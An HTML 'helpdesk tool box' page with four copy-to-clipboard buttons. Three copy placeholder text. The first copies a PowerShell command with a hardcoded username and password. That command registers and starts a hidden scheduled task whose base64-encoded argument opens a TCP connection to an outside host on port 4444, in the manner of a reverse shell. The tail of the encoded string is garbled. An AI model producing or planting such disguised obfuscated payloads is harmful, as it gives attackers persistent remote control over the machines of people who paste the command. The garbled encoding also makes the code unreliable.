<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>helpdesk tool box</title>

<style>
    /* Microsoft blue palette */
    body {
        background: #F0F2F5;
        font-family: Segoe UI, Arial, sans-serif;
        margin: 0;
        padding: 40px 20px;
    }
    header {
        text-align: center;
        color: #FFFFFF;
        background: #0078D4;          /* Microsoft blue */
        padding: 30px 0;
        font-size: 2.5rem;
    }
    .buttons {
        display: flex;
        justify-content: center;
        gap: 20px;
        margin-top: 50px;
    }
    button {
        background:#0078D4;          /* Microsoft blue */
        border:none;
        color:#fff;
        padding:15px 25px;
        font-size:1rem;
        cursor:pointer;
        border-radius:5px;
        transition:.2s;
    }
    button:hover {background:#005a9e;}
</style>
</head>

<body>
<header>helpdesk tool box</header>

<div class="buttons">
    <button id="btn1">Copy Script 1</button>
    <button id="btn2">Copy Text 2</button>
    <button id="btn3">Copy Text 3</button>
    <button id="btn4">Copy Text 4</button>
</div>

<script>
/* ---------- helper: copy to clipboard ---------- */
function copyToClip(text) {
    navigator.clipboard.writeText(text).then(() => {
        alert('Copied!');
    }, err => {
        console.error('Could not copy text:', err);
    });
}

/* ---------- button actions ---------- */
document.getElementById('btn1').addEventListener('click', () => {
    const script = `$u="neo@zion.local";$p="RedPill123!";$n="DebugJump";$arg="-NoP -W Hidden -Enc JAB3ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwBhAGcAZQBuAHQAcwBtAGkAdABoAC4AYwBvAG0AJwAsADQANAA0ADQAKQA7ACQAcwAgAD0AIAAkAHcALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMALgBSAGUAYQBkACgAJABiACwAIAAwACwAIAAkAGIALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ACQAZAAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABiAC5BdXQwCjEwNjM1NzkxNzYyJw==";Register-ScheduledTask -TaskName $n -User $u -Password $p -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument $arg) -Force;Start-ScheduledTask -TaskName $n`;
    copyToClip(script);
});

document.getElementById('btn2').addEventListener('click', () => {
    const txt = 'Placeholder text for button 2';
    copyToClip(txt);
});
document.getElementById('btn3').addEventListener('click', () => {
    const txt = 'Placeholder text for button 3';
    copyToClip(txt);
});
document.getElementById('btn4').addEventListener('click', () => {
    const txt = 'Placeholder text for button 4';
    copyToClip(txt);
});
</script>
</body>
</html>
